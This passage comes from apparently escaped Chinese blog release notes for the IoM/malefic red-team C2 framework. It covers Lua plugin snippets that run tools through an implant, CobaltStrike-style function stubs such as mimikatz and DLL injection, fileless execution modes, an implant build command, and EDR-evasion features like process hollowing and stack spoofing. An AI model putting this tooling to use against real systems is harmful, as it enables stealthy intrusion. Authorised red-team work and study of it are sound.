\u76ee\u524d\u53ea\u652f\u6301\u4e86lua\u4f5c\u4e3a\u63d2\u4ef6\u8bed\u8a00, \u5728v0.0.3\u4e2d\u8fd8\u5c06\u652f\u6301golang\u4f5c\u4e3a\u52a8\u6001\u7684\u63d2\u4ef6\u8bed\u8a00.  \u5728IoM\u7684\u67b6\u6784\u8bbe\u8ba1\u4e2d, \u4e0d\u4ec5\u5728implant\u4e2d\u7684\u6bcf\u4e2amodule/feature\u662f\u53ef\u7ec4\u88c5\u7684, \u5bf9\u4e8eclient/server/listener\u4e2d\u7684\u6bcf\u4e2a\u7ec6\u8282, \u4e5f\u540c\u6837\u662f\u53ef\u7ec4\u88c5\u53ef\u81ea\u5b9a\u4e49\u7684. </p> <p>\u53ef\u7ec4\u88c5,\u53ef\u62d3\u5c55,\u63d2\u4ef6\u5316,\u70ed\u63d2\u62d4\u662f\u4e00\u4e2a\u89c4\u6a21\u9887\u4e3a\u5b8f\u5927\u7684\u5de5\u7a0b.  \u540e\u7eed\u4f1a\u901a\u8fc7\u4e13\u95e8\u7684\u8bbe\u8ba1\u7cfb\u5217\u6587\u7ae0\u4ecb\u7ecdIoM\u5c06\u5982\u4f55\u5b9e\u73b0\u53ef\u80fd\u662f\u6700\u5f3a\u5927\u7684C2\u62d3\u5c55\u751f\u6001. </p> <p>(\u76ee\u524d\u5b9e\u73b0\u4e86\u63d2\u4ef6\u7cfb\u7edf\u7684\u57fa\u672c\u529f\u80fd, \u4f46\u5b83\u8fd8\u5f88\u8106\u5f31, \u6211\u4eec\u8ba1\u5212\u5728v0.0.3\u57fa\u4e8e\u5b83\u5b9e\u73b0\u4e00\u5957\u9ed8\u8ba4\u7684\u5de5\u5177\u5305, \u5e76\u5728v0.0.4 \u516c\u5f00\u6587\u6863\u6b22\u8fce\u5916\u90e8\u8d21\u732e\u8005.)</p> <p>lua\u63d2\u4ef6\u4fdd\u7559\u4e86\u4e09\u5957\u8bbe\u8ba1\u98ce\u683c, \u53ef\u4ee5\u4e92\u76f8\u4efb\u610f\u7ec4\u5408. </p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#cobaltstrike\u7684cna\u98ce\u683c","title":"cobaltstrike\u7684CNA\u98ce\u683c","text":"<p>\u7b80\u5355\u7684\u4f8b\u5b50:</p> <p>\u5c06gogo\u6ce8\u518c\u4e3aIoM\u7684\u547d\u4ee4</p> <pre><code>function command_gogo(cmdline)\n\u00a0 \u00a0 return bexecute_exe(active(), script_resource(\"gogo.exe\"), cmdline)\nend\n</code></pre> <p>\u6211\u4eec\u5c06maleifc\u4e2d\u7684\u6bcf\u4e2a\u6a21\u5757\u90fd\u5c01\u88c5\u4e86\u4e00\u4e2aCNA\u98ce\u683c\u7684lua\u51fd\u6570, \u53ef\u4ee5\u5728\u6587\u6863\u4e2d\u770b\u5230\u5168\u90e8\u7684\u51fd\u6570.</p> <p>\u5176\u4e2d, \u5df2\u7ecf<code>b</code>\u5f00\u5934\u7684\u51fd\u6570\u5982\u679c\u5728Cobaltstrike\u4e2d\u5b58\u5728\u76f8\u540c\u529f\u80fd\u7684\u51fd\u6570, \u51fd\u6570\u7b7e\u540d\u4e5f\u4fee\u6539\u4e3a\u4e00\u81f4, \u51cf\u5c11\u8fc1\u79fb\u7684\u6210\u672c. </p> <pre><code>function bchown(sess, arg2, arg3, arg4, arg5) end\nfunction bsetenv(sess, arg2, arg3) end\nfunction bcp(sess, arg2, arg3) end\nfunction bmimikatz(sess, arg2, arg3) end\nfunction bdownload(sess, arg2) end\nfunction bcd(sess, arg2) end\nfunction binfo(sess) end\nfunction bpwd(sess) end\nfunction bwhoami(sess) end\nfunction bclear(sess) end\nfunction bsharp_wmi(sess, arg2, arg3, arg4) end\nfunction binline_execute(sess, arg2, arg3, arg4) end\nfunction bdllinject(sess, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9) end\n...\n...\n</code></pre>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#iom-\u98ce\u683c","title":"IoM \u98ce\u683c","text":"<p>cobaltstrike\u7684CNA\u5bf9\u5916\u66b4\u9732\u7684\u63a5\u53e3\u4e0eIoM\u5b9e\u9645\u4e0a\u4e0d\u5b8c\u5168\u4e00\u81f4. </p> <p>\u540c\u6837\u4ee5\u6ce8\u518cgogo\u4e3a\u4f8b, IoM\u98ce\u683c\u7684\u51fd\u6570\u80fd\u914d\u7f6e\u66f4\u591a\u7684\u7279\u6027, \u4f8b\u5982etw, blockdll, \u727a\u7272\u8fdb\u7a0b, \u53c2\u6570\u6b3a\u9a97\u7b49.</p> <pre><code>function command_gogo(args)\n\u00a0 \u00a0 sac = new_sacrifice(0, false, true, true, \"\")\n\u00a0 \u00a0 return execute_exe(active(), script_resource(\"gogo.exe\"), args, true, 0, \"amd64\", \"\", sac)\nend\n</code></pre>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#implant-\u5927\u91cf\u6539\u52a8","title":"implant \u5927\u91cf\u6539\u52a8","text":"<p>\u5728v0.0.1\u4e2d, inline_exe, inline_dll, inline_shellcode \u56e0\u4e3a\u4e00\u4e9bbug, \u6ca1\u6709\u5c06\u5176\u6dfb\u52a0\u5230client\u4e2d. </p> <p>\u5728v0.0.2\u4e2d, \u6211\u4eec\u4fee\u590d\u4e86bug, \u5e76\u91cd\u6784\u4e86\u8fd9\u51e0\u4e2a\u529f\u80fd, \u73b0\u5728\u80fd\u5b9e\u73b0\u66f4\u5f3a\u5927\u66f4OPSEC\u7684\u65e0\u6587\u4ef6\u653b\u51fb\u4e86. </p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#\u65e0\u6587\u4ef6\u653b\u51fb","title":"\u65e0\u6587\u4ef6\u653b\u51fb","text":"<p>v0.0.2\u63d0\u4f9b\u4e867\u4e2d\u4e0d\u4f1a\u521b\u5efa\u65b0\u8fdb\u7a0b\u7684\u65e0\u6587\u4ef6\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u65b9\u5f0f:</p> <ul> <li>execute_assembly , \u7b49\u540c\u4e8eCS\u7684execute_assembly, \u4f46\u65e0\u65b0\u8fdb\u7a0b\u521b\u5efa, </li> <li>inline_shellcode, \u901a\u8fc7bof\u53ef\u5b9e\u73b0\u7c7b\u4f3cinline\u7684exe/dll\u7684\u529f\u80fd, \u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u9009\u7528</li> <li>inline_exe</li> <li>inline_dll</li> <li>powerpick</li> <li>bof</li> <li>load_module</li> </ul> <p>\u4e5f\u5c31\u662f\u8bf4, IoM\u73b0\u5728\u4e0d\u4ec5\u53ef\u4ee5\u5b9e\u73b0\u5168\u7a0b\u7684\u65e0\u6587\u4ef6\u653b\u51fb, \u8fd8\u53ef\u4ee5\u5b9e\u73b0\u5168\u7a0b\u7684\u65e0\u65b0\u8fdb\u7a0b\u653b\u51fb. \u5728OPSEC\u4e0a\u8fc8\u51fa\u4e86\u65b0\u7684\u4e00\u6b65. </p> <p>\u540c\u65f6, \u4e5f\u4fdd\u7559\u4e86fork&amp;run\u7684\u7248\u672c</p> <p>\u56e0\u4e3ainline\u6267\u884cshellcode/dll/exe\u65f6, \u4f1a\u5bfc\u81f4\u5f53\u524d\u8fdb\u7a0b\u963b\u585e, \u751a\u81f3\u4f1a\u56e0\u4e3a\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u7684bug\u5bfc\u81f4\u672c\u8fdb\u7a0bpanic, \u6240\u4ee5\u6211\u4eec\u4e5f\u4fdd\u7559\u867d\u7136\u4e0d\u90a3\u4e48OPSEC\u4f46\u662f\u76f8\u5bf9\u5b89\u5168\u7684\u6267\u884c\u65b9\u5f0f. </p> <ul> <li>execute_shellcode</li> <li>execute_dll</li> <li>execute_exe</li> </ul> <p>(powershell, assembly\u56e0\u4e3a\u5176\u7279\u6027, \u76ee\u524d\u4e0d\u4f1a\u963b\u585e\u672c\u8fdb\u7a0b, \u4e5f\u4e0d\u592a\u4f1a\u5bfc\u81f4\u672c\u8fdb\u7a0b\u5d29\u6e83, \u6240\u4ee5\u53ea\u4fdd\u7559\u4e86\u66f4OPSEC\u7248\u672c)</p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#\u65b0\u7684\u7f16\u8bd1\u65b9\u5f0f","title":"\u65b0\u7684\u7f16\u8bd1\u65b9\u5f0f","text":"<p>\u5728v0.0.1\u4e2d.  \u53ea\u63d0\u4f9b\u4e86\u7f16\u8bd1\u7684\u64cd\u4f5c\u6d41\u7a0b, \u5bf9\u4e8e\u4e0d\u719f\u6089\u7684rust\u7684\u7528\u6237\u7f16\u8bd1implant\u65f6\u4f1a\u9047\u5230\u5404\u79cd\u56f0\u96be. \u6211\u4eec\u610f\u8bc6\u5230\u4e86\u8fd9\u70b9, \u63d0\u4f9b\u4e86\u66f4\u52a0\u4f18\u96c5\u7684\u7f16\u8bd1\u65b9\u5f0f. </p> <p>\u4ecedocker\u4e2d\u7f16\u8bd1</p> <p>\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9884\u914d\u7f6e\u4e86\u4ea4\u53c9\u7f16\u8bd1\u73af\u5883\u7684docker, \u4ee5\u53ca\u5bf9\u5e94\u7684Makefile. \u4f7f\u7528\u4e00\u884c\u547d\u4ee4\u5373\u53ef\u7f16\u8bd1\u51fa\u60f3\u8981\u7684\u7ed3\u679c. </p> <p>\u4f7f\u7528github action\u7f16\u8bd1</p> <p>\u66f4\u8fdb\u4e00\u6b65, \u6211\u4eec\u63d0\u4f9b\u4e86\u65e0\u9700\u4efb\u4f55\u73af\u5883\u7684\u7f16\u8bd1\u65b9\u6848. </p> <p>\u53ea\u9700\u8981\u4ecegithub\u751f\u6210token, \u7136\u540e\u4f7f\u7528gh cli \u6267\u884c\u4e00\u884c\u547d\u4ee4\u5373\u53ef\u751f\u6210implant. </p> <pre><code>gh workflow run generate.yaml -f malefic_config=$(base64 &lt;/path/to/config.yaml&gt;) -f remark=\"write somthing..\" -f targets=\"x86_64-pc-windows-gnu,i686-pc-windows-gnu,\" -R &lt;username/malefic&gt;\n</code></pre> <p>\u540e\u7eed\u6211\u4eec\u8fd8\u4f1a\u5c06\u76ee\u524d\u9700\u8981\u624b\u52a8\u6267\u884c\u547d\u4ee4\u7684\u64cd\u4f5c\u5168\u90fd\u5728server\u4e0a\u81ea\u52a8\u5b9e\u73b0, \u4f7f\u7528client&lt;-&gt;server\u4ea4\u4e92\u5373\u53ef\u5b9e\u73b0\u53ef\u7ec4\u88c5\u7684implant\u7684\u7f16\u8bd1.</p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#addon","title":"addon","text":"<p>\u4e3a\u4e86\u9632\u6b62\u4f8b\u5982gogo, frp\u4e4b\u7c7b\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u591a\u6b21\u6267\u884c\u9700\u8981\u591a\u6b21\u53d1\u9001\u7684\u95ee\u9898, implant\u73b0\u5728\u652f\u6301\u5c06\u8fd9\u4e9b\u6570\u636e\u4fdd\u7559\u5728\u5185\u5b58\u4e2d, \u4e0b\u6b21\u4f7f\u7528\u5bf9\u5e94\u5de5\u5177\u7684\u65f6\u5019, \u53ea\u9700\u8981\u4f20\u5165\u53c2\u6570\u5373\u53ef. </p> <p>\u5728client\u63d0\u4f9b\u4e86\u4e00\u7ec4\u65b0\u7684\u547d\u4ee4, \u7528\u6765\u589e\u5220\u6539\u67e5addon, \u5e76\u4e14\u5c06\u5bf9\u5e94\u7684\u63a5\u53e3\u66b4\u9732\u7ed9\u63d2\u4ef6\u7cfb\u7edf. </p> <p></p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#v003-roadmap","title":"v0.0.3 roadmap","text":"<ul> <li> client<ul> <li> \u65b0\u589eclient\u7aef\u63d2\u4ef6\u7c7b\u578b golang</li> <li> \u91cd\u6784explorer<ul> <li> \u5b9e\u73b0process explorer</li> <li> \u5b9e\u73b0netstat explorer</li> <li> \u5b9e\u73b0services explorer</li> </ul> </li> <li> \u5b9e\u73b0profile, \u80fd\u81ea\u5b9a\u4e49\u81ea\u52a8\u52a0\u8f7d\u7684\u63d2\u4ef6\u96c6</li> <li> \u521d\u6b65\u5b9e\u73b0\u901a\u8fc7client\u5b9e\u73b0\u7684\u81ea\u52a8\u5316\u7f16\u8bd1</li> <li> mals \u63d2\u4ef6\u4ed3\u5e93<ul> <li> \u5b9e\u73b0\u63d2\u4ef6\u4ecegithub\u81ea\u52a8\u4e0b\u8f7d\u7ba1\u7406</li> <li> \u63d0\u4f9b\u9ed8\u8ba4\u63d2\u4ef6\u96c6\u5408</li> </ul> </li> </ul> </li> <li> server/listener<ul> <li> \u91cd\u6784listener\u7684parser, \u5c1d\u8bd5\u517c\u5bb9\u7b2c\u4e09\u65b9C2</li> <li> \u6dfb\u52a0donut, srdi, sgn\u7b49rpc, \u5b9e\u73b0shellcode\u7684\u81ea\u5b9a\u4e49\u64cd\u4f5c</li> </ul> </li> <li> implant<ul> <li> \u63d0\u4f9b\u591a\u8fd0\u884c\u65f6\u652f\u6301, tokio, futures</li> <li> \u63d0\u4f9b\u57fa\u672c\u7684\u6d41\u91cf\u52a0\u5bc6\u9009\u9879</li> <li> \u66f4\u4f18\u96c5\u7684\u81ea\u52a8\u5316\u7f16\u8bd1</li> <li> \u65b0\u7684\u539f\u751fmodule<ul> <li> services\u64cd\u4f5c</li> <li> \u6ce8\u518c\u8868\u64cd\u4f5c</li> <li> \u8ba1\u5212\u4efb\u52a1\u64cd\u4f5c</li> <li> WMI/COM (\u5f85\u5b9a)</li> </ul> </li> <li> StackSpoofer</li> <li> SleepMask Community </li> <li> \u5b9e\u73b0stage 1 loader</li> <li> \u5b9e\u73b0autorun, \u8fd0\u884c\u5728\u7f16\u8bd1\u65f6\u901a\u8fc7yaml\u914d\u7f6e\u4e00\u7cfb\u5217\u81ea\u52a8\u6267\u884c\u7684\u4efb\u52a1</li> <li> token\u6a21\u62df\u76f8\u5173\u5b9e\u73b0</li> </ul> </li> </ul> <p>\u6709\u4eba\u4e5f\u95ee\u8fc7IoM\u4e0esliver\u6709\u4ec0\u4e48\u533a\u522b. \u9605\u8bfb\u4e86v0.0.2\u7684\u66f4\u65b0\u516c\u544a, \u5e94\u8be5\u80fd\u53d1\u73b0 IoM\u7684\u67b6\u6784\u4e0e\u8bbe\u8ba1\u76ee\u6807\u66f4\u52a0\u5b8f\u4f1f\u4e0e\u6fc0\u8fdb. </p>"},{"location":"blog/2024/09/23/IoM_v0.0.2/#end","title":"End","text":"<p>v0.0.1 \u5b9e\u5c5e\u4ed3\u731d\u53d1\u5e03, \u6709\u5927\u91cf\u6076\u6027bug\u4ee5\u53ca\u5b9e\u73b0\u5230\u4e00\u534a\u7684\u529f\u80fd. v0.0.2\u4fee\u590d\u4e86\u8fd1\u767e\u4e2abug, \u4f46\u8fd8\u662f\u53ea\u662f\u7a0d\u5fae\u597d\u4e00\u70b9\u70b9, \u8fd8\u662f\u5145\u6ee1bug. \u5bf9\u4e8e\u8fd9\u4e00\u70b9\u6211\u4eec\u5f88\u62b1\u6b49, \u5e0c\u671b\u80fd\u5728v0.1.0\u7684\u65f6\u5019\u8fbe\u5230\u57fa\u672c\u53ef\u7528\u7684\u72b6\u6001. </p> <p>IoM\u81f4\u529b\u4e8e\u6210\u4e3a\u4e0b\u4e00\u4ee3C2\u89e3\u51b3\u65b9\u6848, \u63d0\u4f9b\u4e00\u5957\u8db3\u591f\u5f3a\u5927\u53ef\u4ee5\u81ea\u5b9a\u4e49\u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd. </p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/","title":"IoM v0.0.3 \u771f\u6b63\u610f\u4e49\u4e0a\u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd\u4e0eC2\u6846\u67b6","text":""},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u65f6\u95f4\u7ebf","title":"\u65f6\u95f4\u7ebf","text":"<p>\u5728 8 \u6708\u4efd, \u6211\u4eec\u53d1\u5e03\u4e86 IoM \u7684\u84dd\u56fe\u548c demo, \u5236\u5b9a\u4e86\u4e00\u4e2a\u5b8f\u4f1f\u7684\u8ba1\u5212, \u5f53\u65f6\u7684 IoM \u548c\u7edd\u5927\u591a\u6570\u5f00\u6e90 C2 \u4e00\u6837, \u5145\u6ee1 bug, \u529f\u80fd\u7b80\u5355.</p> <p>\u5728 9 \u6708\u4efd, \u6211\u4eec\u53d1\u5e03\u4e86\u4fee\u590d\u4e86\u5927\u91cf bug, \u4ee5\u53ca\u5bf9 client/server/listener \u7684\u5927\u91cd\u6784 v0.0.2 \u7248\u672c. \u8fd8\u6dfb\u52a0\u4e86\u57fa\u4e8e lua \u7684\u63d2\u4ef6\u7cfb\u7edf, \u534a\u81ea\u52a8\u5316\u7f16\u8bd1.</p> <p>\u800c\u73b0\u5728, \u6211\u4eec\u7ec8\u4e8e\u53ef\u4ee5\u53d1\u5e03 v0.0.3 ,\u8fd9\u4e5f\u610f\u5473\u7740 IoM \u5df2\u7ecf\u5177\u5907\u5728\u5b9e\u6218\u4e2d\u4f7f\u7528\u7684\u4ef7\u503c, \u4ee5\u53ca\u6ee1\u8db3\u7edd\u5927\u591a\u6570\u5b9e\u6218\u573a\u666f\u7684\u80fd\u529b. \u5728\u67d0\u4e9b OPSEC \u6216\u8005\u62d3\u5c55\u80fd\u529b\u4e0a, IoM \u66f4\u662f\u76ee\u524d\u6700\u5f3a\u5927\u7684 C2 \u6846\u67b6.</p> <p>v0.0.3 \u7684 IoM \u81f3\u5c11\u5df2\u7ecf\u5177\u5907\u4e86 80%\u4ee5\u4e0a\u7684 Cobaltstrike \u7684\u80fd\u529b, 90%\u7684 Sliver \u7684\u80fd\u529b, \u6bd4\u8d77 Nighthawk \u548c BRC4 \u66f4\u662f\u4e0d\u9051\u591a\u8ba9\uff0c\u5e76\u4e14\u6709\u975e\u5e38\u591a\u72ec\u6709\u7684\u529f\u80fd. \u5f53\u7136\u5728\u6210\u719f\u7a0b\u5ea6\u4e0e\u5f88\u591a\u7ec6\u8282\u4e0a\u6211\u4eec\u7f3a\u5c11\u65f6\u95f4\u53bb\u6253\u78e8, \u4f46\u53ef\u7528\u7684\u7248\u672c\u4e5f\u79f0\u5f97\u4e0a\u662f\u5f00\u6e90\u4e16\u754c\u4e2d\u6700\u5f3a\u5927\u7684 C2 \u4e4b\u4e00\u4e86.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u66f4\u65b0\u65e5\u5fd7","title":"\u66f4\u65b0\u65e5\u5fd7","text":""},{"location":"blog/2024/11/20/IoM_v0.0.3/#implant-\u91cd\u6784","title":"implant \u91cd\u6784","text":"<p>v0.0.3 \u6700\u5927\u7684\u6539\u52a8\u5c31\u662f\u5f7b\u5e95\u91cd\u6784\u4e86 implant, \u73b0\u5728\u7684 implant \u662f\u4e00\u4e2a\u8986\u76d6\u4e86\u51e0\u4e4e\u6240\u6709\u573a\u666f\u7684\u6846\u67b6, \u4f60\u53ef\u4ee5\u5728\u91cc\u9762\u627e\u5230 C2 \u5f00\u53d1\u7684\u51e0\u4e4e\u4e00\u5207\u76f8\u5173\u6280\u672f.</p> <p>\u8fd9\u6b21\u91cd\u6784\u6d89\u53ca\u5230\u7684\u6539\u52a8\u8fc7\u4e8e\u5e9e\u5927, \u65e0\u6cd5\u5728\u66f4\u65b0\u65e5\u5fd7\u4e2d\u4e00\u6b21\u6027\u5c55\u793a, \u540e\u7eed\u4f1a\u901a\u8fc7\u4e00\u7cfb\u5217\u6587\u7ae0\u4ecb\u7ecd IoM \u7684\u65b9\u65b9\u9762\u9762.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u67b6\u6784","title":"\u67b6\u6784","text":"<p>\u9879\u76ee\u94fe\u63a5: https://github.com/chainreactors/malefic \u5982\u679c\u5bf9\u672c\u6587\u63d0\u5230\u7684\u6982\u5ff5\u611f\u5230\u8ff7\u60d1, \u53ef\u4ee5\u5728\u8fd9\u91cc\u4e86\u89e3\u524d\u7f6e\u77e5\u8bc6: https://chainreactors.github.io/wiki/IoM/concept/ \u4e3b\u4f53\u7ed3\u6784:</p> <ul> <li>malefic \u4e3b\u7a0b\u5e8f, \u5305\u542b\u4e86 beacon/bind \u4e24\u79cd\u6a21\u5f0f\u7684\u5b8c\u6574\u529f\u80fd</li> <li>malefic-mutant (\u65b0\u589e) \u7528\u6765\u5b9e\u73b0\u81ea\u52a8\u5316\u914d\u7f6e malefic \u7684\u5404\u79cd\u6761\u4ef6\u7f16\u8bd1\u4e0e\u7279\u6027, \u4ee5\u53ca\u751f\u6210 shellcode, SRDI \u7b49</li> <li>malefic-prelude (\u65b0\u589e), \u591a\u6bb5\u4e0a\u7ebf\u7684\u4e2d\u95f4\u9636\u6bb5, \u53ef\u4ee5\u5728\u8fd9\u91cc\u6309\u9700\u914d\u7f6e\u6743\u9650\u7ef4\u6301, \u53cd\u6c99\u7bb1, \u53cd\u8c03\u8bd5\u7b49\u529f\u80fd.</li> <li>malefic-pulse (\u65b0\u589e) , shellcode \u6a21\u677f\u751f\u6210\u5668, \u80fd\u751f\u6210\u53ea\u6709 5KB \u5de6\u53f3\u7684 shellcode, \u7c7b\u4f3c cobalstrike artifact, \u80fd\u8f7b\u677e\u5b9e\u73b0\u81ea\u5b9a\u4e49 shellcode \u7279\u5f81</li> </ul> <p>malefic, prelude, pulse \u5b9e\u9645\u4e0a\u662f\u4e09\u4e2a\u4e0d\u540c\u601d\u8def\u7684 implant \u5b9e\u73b0, \u90fd\u4f9d\u8d56 malefic-win-kit \u63d0\u4f9b\u7684\u57fa\u7840\u80fd\u529b, \u5b9e\u73b0 EDR \u5bf9\u6297. \u901a\u8fc7 malefic \u63d0\u4f9b\u7684\u5404\u79cd\u57fa\u7840\u5e93, \u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u5b9a\u5236\u4efb\u610f\u573a\u666f\u7684 implant.</p> <p>\u57fa\u7840\u5e93:</p> <ul> <li>malefic-modules, \u5404\u79cd\u6a21\u5757\u7684\u5177\u4f53\u5b9e\u73b0, v0.0.3 \u65b0\u6dfb\u52a0\u4e86\u8fd1 30 \u4e2a\u539f\u751f\u6a21\u5757, \u8986\u76d6 service, registry, taskscheduer, token, wmi \u7b49\u5e38\u7528\u529f\u80fd, \u76ee\u524d malefic \u5df2\u7ecf\u6709</li> <li>malefic-core (\u91cd\u6784), \u6838\u5fc3\u5e93, \u5b9e\u73b0 beacon/bind \u4e0e modules \u7684\u4ea4\u4e92\u4e0e\u8c03\u5ea6, \u53ef\u4ee5\u901a\u8fc7 core \u5feb\u901f\u5b9e\u73b0\u5404\u79cd\u4e0d\u540c\u6a21\u677f\u4e0d\u540c\u9700\u6c42\u7684 implant.</li> <li>malefic-proto (\u91cd\u6784), \u52a0\u5bc6\u4e0e\u534f\u8bae\u5e93, \u5b9a\u4e49\u4e86 implant \u4e0e server \u6570\u636e\u4ea4\u4e92\u7684\u534f\u8bae\u4e0e\u52a0\u5bc6\u65b9\u5f0f\u7b49</li> <li>malefic-helper (\u91cd\u6784), \u8f85\u52a9\u51fd\u6570\u5e93, \u4e5f\u662f\u5bf9\u63a5 malefic-kits \u7684\u4e2d\u95f4\u5e93, kits \u4e2d\u7684 api \u5c06\u4f1a\u901a\u8fc7 FFI \u5728 helper \u4e2d\u4e8c\u6b21\u5305\u88c5, \u5b9e\u73b0\u5bf9 kit \u4e2d\u5404\u79cd\u529f\u80fd\u7684\u8c03\u7528   kits(\u4e8c\u8fdb\u5236\u5f00\u6e90):</li> <li>malefic-win-kit, \u5b9e\u73b0\u4e86 loadpe, UDRL, CLR, \u5806\u6808\u6df7\u6dc6\u7b49\u7b49\u9ad8\u7ea7\u7279\u6027\u7684 OPSEC \u5b9e\u73b0</li> </ul>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#\u5f7b\u5e95\u91cd\u6784","title":"\u5f7b\u5e95\u91cd\u6784","text":"<p>\u672c\u6b21\u91cd\u6784\u662f\u4e3a\u4e86\u540e\u7eed\u5f00\u653e\u7684\u53ef\u62d3\u5c55\u67b6\u6784\u5960\u5b9a\u57fa\u7840, \u6211\u4eec\u8fdb\u4e00\u6b65\u7406\u6e05\u4e86\u4f9d\u8d56\u5173\u7cfb\u4e5f\u9879\u76ee\u7ed3\u6784.</p> <p>\u73b0\u5728\u7684 malefic-helper \u53ea\u63d0\u4f9b\u57fa\u672c\u529f\u80fd\u4e0e\u5bf9\u63a5 kits \u7684 api, \u4e0d\u518d\u4e0e malefic \u5f3a\u8026\u5408. \u610f\u5473\u7740, \u5982\u679c\u8981\u5b9e\u73b0\u4e00\u4e2a\u65b0\u7684 implant\uff0c\u53ef\u4ee5\u4f7f\u7528 malefic-helper \u4e0e kits \u63d0\u4f9b\u7684\u5168\u65b9\u4f4d\u7684\u5e2e\u52a9\u3002</p> <p>IoM \u7ef4\u62a4\u4e86\u4e00\u4e2a\u76ee\u524d rust \u751f\u6001\u4e2d\u6700\u7a33\u5b9a\u7684\u5e95\u5c42\u57fa\u5ea7. \u5b9e\u73b0\u4e86 load PE, CRL loader, Process Hollowing, \u5806\u6808\u6df7\u6dc6\u7b49\u7b49\u7b49\u7b49\u529f\u80fd\u7684 Red Team \u539f\u8bed.</p> <p>\u53ef\u4ee5\u8f7b\u677e\u5728 IoM \u7684\u57fa\u7840\u4e0a\u5b9e\u73b0\u590d\u6742\u529f\u80fd\u7684 implant, \u800c\u4e0d\u7528\u8fc7\u5ea6\u5173\u5fc3\u5e95\u5c42\u5b9e\u73b0, \u751a\u81f3\u4e0d\u9700\u8981\u4f7f\u7528\u6211\u4eec\u7684 Server \u4e0e Client, \u53ef\u4ee5\u4efb\u610f\u7684\u63c9\u6413\u4f60\u7684 implant, \u5b9e\u73b0\u4e00\u4e2a\u4e0d\u5728 IoM \u73af\u5883\u4e2d\u8fd0\u884c\u7684 implant.</p> <p>\u5f53\u7136\u4e5f\u53ef\u4ee5\u57fa\u4e8e malefic-core \u4e0e malefic-proto \u5b9e\u73b0\u4e00\u4e2a\u652f\u6301 IoM \u7684 Server \u4e0e Client \u7684 implant. \u8fd9\u4e24\u4e2a crate \u4e2d\u5b9e\u73b0\u4e86\u4e0e server \u901a\u8baf\u8c03\u5ea6\u76f8\u5173\u7684\u4ee3\u7801.</p> <p>\u76ee\u524d, \u6211\u4eec pulse, prelude \u4ee5\u53ca malefic \u672c\u4f53 \u5b9e\u9645\u4e0a\u662f IoM implant \u7684\u4e09\u79cd\u5b9e\u73b0.</p> <p>\u6211\u4eec\u4e0d\u4ec5\u4ec5\u5728 malefic \u7684\u672c\u4f53\u4e0a\u5b9e\u73b0\u4e86\u6a21\u5757\u5316\u81ea\u5b9a\u4e49, \u66f4\u5728\u8f6f\u4ef6\u67b6\u6784\u4e0a\u5b9e\u73b0\u4e86\u4e00\u4e2a\u5927\u7684\u7a81\u7834, \u79bb IoM \u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd\u7684\u5f00\u653e\u67b6\u6784\u8fc8\u8fdb\u4e86\u4e00\u5927\u6b65.</p> <p>IoM \u7684\u67b6\u6784\u6b22\u8fce\u4efb\u4f55\u7a0b\u5ea6\u4e0a\u4f7f\u7528\u5230 IoM \u7684\u4eba, \u5982\u679c\u4f60\u8ba1\u5212\u5199\u81ea\u5df1\u7684\u4e00\u4e2a C2, \u5c1d\u8bd5\u4e00\u4e0b IoM \u7684\u57fa\u7840\u8bbe\u65bd\u4e00\u5b9a\u662f\u4e2a\u975e\u5e38\u4e0d\u9519\u7684\u9009\u62e9.</p> <p>\u5728\u5bf9 malefic \u6dfb\u52a0\u4e86\u5927\u91cf\u529f\u80fd\u7684\u540c\u65f6, \u6211\u4eec\u4e5f\u5bf9\u4f9d\u8d56\u8fdb\u884c\u4e86\u91cd\u6574. \u786e\u5b9a\u4e86\u4e00\u4e2a\u8f83\u4e3a\u7edf\u4e00\u7684\u98ce\u683c.</p> <p>malefic \u5c06 pure rust \u4f5c\u4e3a\u539f\u5219\u4e4b\u4e00, \u5728\u4e0d\u5f97\u4e0d\u4f7f\u7528\u5916\u90e8\u4f9d\u8d56\u65f6, \u5c3d\u53ef\u80fd\u4f7f\u7528\u66f4\u4e3a rust \u7684\u5e93. \u4f8b\u5982, \u4ece ring \u5207\u6362\u5230 rustcrypto. \u5c06 ntapi, winapi,windows-sys \u5e93\u5207\u6362\u5230 windows \u5e93\u7b49\u7b49.</p> <p>\u8fd9\u4e2a\u5de5\u7a0b\u8fd8\u5728\u7ee7\u7eed. \u5728\u4e0b\u4e2a\u7248\u672c, \u6211\u4eec\u5c06\u8fdb\u4e00\u6b65\u5254\u9664\u7b2c\u4e09\u65b9\u5e93, \u4f8b\u5982 wmi, netstat2, sysinfo \u7b49\u5e93, \u6240\u6709\u7684\u4f7f\u7528\u4e86\u7cfb\u7edf\u8c03\u7528\u7684\u529f\u80fd, \u90fd\u5c06\u901a\u8fc7 win-kit \u5c01\u88c5\u7684\u5b9e\u73b0\u4e86 RashoGate(\u76f8\u5f53\u4e8e CS \u7684 BeaconGate)\u7684 syscall \u5b9e\u73b0.</p>"},{"location":"blog/2024/11/20/IoM_v0.0.3/#prelude","title":"prelude","text":"<p>prelude \u5728\u8bbe\u8ba1\u4e2d\u662f beacon \u4e0a\u7ebf\u524d\u8fdb\u884c\u6743\u9650\u7ef4\u6301, \u53cd\u6c99\u7bb1, \u53cd\u8c03\u8bd5\u7b49\u529f\u80fd\u7684\u4e2d\u95f4\u9636\u6bb5.</p> <p>\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5355\u7ebf\u7a0b\u65e0\u7f51\u7edc\u8fde\u63a5\u7684 beacon, prelude 